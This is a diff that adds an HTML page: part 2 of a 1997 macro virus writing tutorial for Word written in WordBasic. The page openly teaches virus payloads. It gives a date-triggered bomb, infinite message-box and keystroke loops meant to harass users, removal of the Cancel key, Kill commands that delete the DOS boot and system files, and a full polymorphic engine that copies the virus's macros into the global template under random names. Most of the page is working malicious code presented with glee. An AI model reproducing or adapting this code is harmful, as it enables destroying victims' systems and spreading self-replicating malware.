@@ -1,0 +1,241 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Macro Virus Tutorial #2 (Dark Night)</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>THE MACRO VIRUS WRITING
+TUTORIAL<BR>
+</FONT><FONT SIZE=+2>PART 2<BR>
+BY<BR>
+DARK NIGHT OF VBB</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<PRE><B>LEGALESE
+--------</B></PRE>
+
+<PRE>I SHALL NOT BE HELD RESPONSIBLE FOR ANY DAMAGE CREATED THROUGH DIRECT OR INDIRECT
+USE OF THE PUBLICISED MATERIAL.  THIS DOCUMENT IS COPYRIGHT 1997 TO ME,
+DARK NIGHT OF VBB.  HEREWITH I GRANT ANYBODY LICENSE TO REDISTRIBUTE THIS
+DOCUMENT AS LONG AS IT IS KEPT IN WHOLE AND MY COPYRIGHT NOTICE IS NOT
+REMOVED.  ALSO IF I FIND ANY LAMERS WHO JUST TAKE THE CODE PUBLISHED HERE
+AND SAY IT IS THEIR OWN I WILL SEE TO IT THAT THEY'LL BE PUNISHED.(Sure.....Sure :-))!!!
+
+<B>INTRO TO LIFE
+----- -- ----</B></PRE>
+
+<PRE>Yep, it's time again for another tutorial!  I got so much positive feedback(and these people
+wouldn't leave me alone)so I decided to continue.  This time I will mostly be talking about
+virus payloads as I presented the infection routines to you last time....  Oh yeah!  The question
+about books on Word BAsic reached me a lot of times too!  Here's a book I've been told is
+supposed to be good: &quot;BEGINNING WORDBASIC PROGRAMMING&quot;, ISBN: #1874416869.  Enjoy!
+
+<B>PAYLOAD??  I'M LOST!
+--------------------</B></PRE>
+
+<PRE>Why are you reading this then?  The Payload is the bomb....The thing that does stuff besides
+infecting....
+
+<B>WHAT IS POSSIBLE?
+-----------------</B></PRE>
+
+<PRE>Well, there are a lot of things you can do... You can format harddrives,Crash word, Run
+other proggies(dos virii) etc.  But, you don't want your virus to this every single time
+it is run right?  So you need a check routine:
+
+If Month(Now()) = 1 And Day(Now()) = 3 Then   'Easy right?
+BOMB HERE
+
+ELSE
+'whatever
+
+End IF
+
+The easiest method to annoy a user is to send the following very frequently:
+
+SendKeys &quot;%&quot;+&quot;{F4}&quot;
+
+This has the effect of pressing alt+f4...The problem is that word still prompts to save.  Since
+we are in the annoying stuff right now, there is another one:
+
+Again:
+MsgBox&quot;HAHAHAHAHA!&quot;
+Goto Again
+
+Mean isn't it....Imagine someone working and this thing popping up one day when he opens your
+word document.  Since his template was infected, he will see this more often :)
+
+<B>MEAN STUFF
+---------</B></PRE>
+
+<PRE>Ok, you can get a good kick out of the above, but what if you really want to get someone?  Yes,
+you guessed it... There's even meaner stuff :)
+
+ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = &quot;Cancel&quot;, .Remove, .Context = 0
+'The above macro looks handy for the close all function :)  (To all who don't understand: It
+'removes the cancel button!)
+
+Kill&quot;C:\Autoexec.bat&quot;
+Kill&quot;C:\Config.sys&quot;
+Kill&quot;C:\Command.com&quot;
+Kill&quot;C:\io.sys&quot;
+Kill&quot;C:\msdos.sys&quot;
+Finish:
+
+Ain't this mean :)  I got the next one from the Nightmare Joker.  Enjoy....
+
+ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = &quot;Cancel&quot;, .Remove, .Context = 0
+
+SendKeys &quot;^&quot; + &quot;%&quot; + &quot;-&quot;
+
+Close all documents and look under File....How's your Cursor doin'?
+
+<B>POLYMORPHIC??
+-------------</B></PRE>
+
+<PRE>Yes, it is possible....  Here's a polymorphic engine which uses random names for its macros
+to hide is indentity.  This code is from The Nightmare Joker!  I translated it into English:
+
+Sub MAIN
+On Error Goto Done
+
+A$ = FileName$()
+If A$ = &quot;&quot; Then Goto Finish
+
+If VInstalled = 0 Then
+        Run1
+        Run2
+        FileSaveAll 1, 1
+Else
+        Goto Done
+End If
+
+Done:
+A$ = FileName$()
+If A$ = &quot;&quot; Then
+        Goto Finish
+Else
+        Insert &quot; &quot;
+End If
+
+Finish:
+MsgBox &quot;polymorph&quot;, - 8
+End Sub
+
+Sub Run1
+X$ = Fun$(F$, G$, H$, J$)
+Y$ = Fun$(F$, G$, H$, J$)
+
+Z$ = X$ + Y$
+
+R1$ = GetDocumentVar$(&quot;VirNameDoc&quot;)
+CO$ = FileName$() + &quot;:&quot; + R1$
+MacroCopy CO$, &quot;Global:&quot; + Z$
+SetProfileString &quot;Intl&quot;, &quot;Info2&quot;, Z$
+ToolsCustomizeKeyboard .KeyCode = 65, .Category = 2, .Name = Z$, .Add, .Context = 0
+End Sub
+
+Sub Run2
+X$ = Fun$(F$, G$, H$, J$)
+Y$ = Fun$(F$, G$, H$, J$)
+
+Z$ = X$ + Y$
+
+R2$ = GetDocumentVar$(&quot;VirName&quot;)
+OC$ = FileName$() + &quot;:&quot; + R2$
+MacroCopy OC$, &quot;Global:&quot; + Z$
+SetProfileString &quot;Intl&quot;, &quot;Info1&quot;, Z$
+ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = Z$, .Add, .Context = 0
+End Sub
+
+Function VInstalled
+CC$ = GetProfileString$(&quot;Intl&quot;, &quot;Info1&quot;)
+        VInstalled = 0
+        If CountMacros(0) &gt; 0 Then
+                For i = 1 To CountMacros(0)
+                If MacroName$(i, 0) = CC$ Then
+                        VInstalled = 1
+                End If
+        Next i
+End If
+End Function
+
+Function Fun$(F$, G$, H$, J$)
+One = 1169
+Two = 9294
+Num = Int(Rnd() * (Two - One) + One)
+A$ = Str$(Num)
+A$ = LTrim$(A$)
+
+B$ = Mid$(A$, 1, 1)
+C$ = Mid$(A$, 2, 1)
+D$ = Mid$(A$, 3, 1)
+E$ = Mid$(A$, 4, 1)
+
+If B$ = &quot;1&quot; Then F$ = &quot;A&quot;
+If B$ = &quot;2&quot; Then F$ = &quot;B&quot;
+If B$ = &quot;3&quot; Then F$ = &quot;C&quot;
+If B$ = &quot;4&quot; Then F$ = &quot;D&quot;
+If B$ = &quot;5&quot; Then F$ = &quot;E&quot;
+If B$ = &quot;6&quot; Then F$ = &quot;F&quot;
+If B$ = &quot;7&quot; Then F$ = &quot;G&quot;
+If B$ = &quot;8&quot; Then F$ = &quot;H&quot;
+If B$ = &quot;9&quot; Then F$ = &quot;I&quot;
+If B$ = &quot;0&quot; Then F$ = &quot;J&quot;
+
+If C$ = &quot;1&quot; Then G$ = &quot;H&quot;
+If C$ = &quot;2&quot; Then G$ = &quot;I&quot;
+If C$ = &quot;3&quot; Then G$ = &quot;J&quot;
+If C$ = &quot;4&quot; Then G$ = &quot;K&quot;
+If C$ = &quot;5&quot; Then G$ = &quot;L&quot;
+If C$ = &quot;6&quot; Then G$ = &quot;M&quot;
+If C$ = &quot;7&quot; Then G$ = &quot;N&quot;
+If C$ = &quot;8&quot; Then G$ = &quot;O&quot;
+If C$ = &quot;9&quot; Then G$ = &quot;P&quot;
+If C$ = &quot;0&quot; Then G$ = &quot;Q&quot;
+
+If D$ = &quot;1&quot; Then H$ = &quot;A&quot;
+If D$ = &quot;2&quot; Then H$ = &quot;B&quot;
+If D$ = &quot;3&quot; Then H$ = &quot;C&quot;
+If D$ = &quot;4&quot; Then H$ = &quot;D&quot;
+If D$ = &quot;5&quot; Then H$ = &quot;E&quot;
+If D$ = &quot;6&quot; Then H$ = &quot;F&quot;
+If D$ = &quot;7&quot; Then H$ = &quot;G&quot;
+If D$ = &quot;8&quot; Then H$ = &quot;H&quot;
+If D$ = &quot;9&quot; Then H$ = &quot;I&quot;
+If D$ = &quot;0&quot; Then H$ = &quot;J&quot;
+
+If E$ = &quot;1&quot; Then J$ = &quot;R&quot;
+If E$ = &quot;2&quot; Then J$ = &quot;S&quot;
+If E$ = &quot;3&quot; Then J$ = &quot;T&quot;
+If E$ = &quot;4&quot; Then J$ = &quot;U&quot;
+If E$ = &quot;5&quot; Then J$ = &quot;V&quot;
+If E$ = &quot;6&quot; Then J$ = &quot;W&quot;
+If E$ = &quot;7&quot; Then J$ = &quot;X&quot;
+If E$ = &quot;8&quot; Then J$ = &quot;Y&quot;
+If E$ = &quot;9&quot; Then J$ = &quot;Z&quot;
+If E$ = &quot;0&quot; Then J$ = &quot;Q&quot;
+
+Fun$ = F$ + G$ + H$ + J$
+End Function
+
+I'm going to leave you withou explination at this point because if you have no idea what this
+is about, then this is nothing for you as a beginner!
+
+<B>WHERE TO?
+---------</B></PRE>
+
+<PRE>I don't know when I will continue this, but I'm sure that if there are any news that I will gladly
+continue.  As usual you can reach me at Dark_Night@ilf.net with any questions!  Also I would
+appreciate any future topic suggestions!
+</PRE>
+
+<P>
+<HR WIDTH="100%"></P>
+
+</BODY>
+</HTML>
